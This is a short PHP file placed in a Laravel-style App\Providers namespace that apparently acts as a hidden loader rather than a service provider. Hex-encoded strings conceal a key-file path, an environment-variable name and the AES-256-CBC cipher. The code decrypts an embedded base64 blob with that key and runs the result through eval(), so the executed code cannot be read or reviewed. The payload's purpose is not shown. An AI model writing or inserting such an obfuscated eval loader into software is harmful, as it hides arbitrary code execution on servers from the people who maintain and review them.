<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('8uVLTVUGw3zPm/bX7f0XKg==');

$c=base64_decode(

'YxB7QKZYalTHDHG915b7PR4MDpVPhOwl0z68ZbUJw5kSdYlotun29PBMhheFpdFWjenN/b3NKdiy' .
'kynI94MJ1eoITe0vJu53SIU/zfGuRGlNEqPNJm/m67iVJluGgccd8Lu6v/bBQVYvMD1kuRwsLdTY' .
'miRi9eeUAFzFLtXhHrSR4gidF3PBd3YOvdv5cxHI8wdDq33AjLezbMHabL7SPC69adZszLBdtA8d' .
'nGeGctMLYYKJvZzZXERNyBnkKCql3h9i12ouXsVTL6bsEvdJQUJsIWjbBN7D3ojSpj3nQT9DQIcJ' .
'vrP34j7UzG1KaZYUGc4M48YpAv+LHWFaurU1/nK2R479N5cLQrspd5pFAvQd/UU9xKgM4yoR/Hui' .
'd8ZYvXRmen2b+FdjuiX9znDiuK4pPkfT9+HHqMy0xI9dwBw1xqEQ2Ie9ioENosyUyhi18CR6uxV7' .
'R+9KskyevoF1Ps35I81JAKhUvdKdN0ZE0KZZuUk1L6mtYoFevtBFNUcGX3/pucsDkJicwFxaU83t' .
'rSyanj5rpqUVgPt5CLWv80Bb4fY1F4RX1h9QJgWClhg6A2qhTaJjykRwsdPoLKQRxFH6Az+nrWCc' .
'c8AMXKbMorqLUFn++xouc7Me62LpeTNEMiiAvlRuIhALybFsevDgCXlscdfXRSNPKHn/tVjzsHbF' .
'afY5vEGi23eQSvAmZvN5Vww6g5H6+mtaeO3hq9QjxPW+kyNukXJoIE30Das8vtV6lZzsOgqDa6He' .
'f+uFH/B6kgGtM+V/MzETovF0S2npSFwrokOdq3WQOBSU6oXaFnYDz0GOmRL8RKT1dGYj1W5ATuCx' .
'YBW8dFMJsCsARS/eu8cGfbOniVVZIA/k/YHxgB544pLsI68+Ym67+XDHTXmYf6IMv94SYeTov/mT' .
'Xbpyl0SSnainXUovk3u9d/fwruOy0zFDv/zipw5ejy4ZFy4k'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

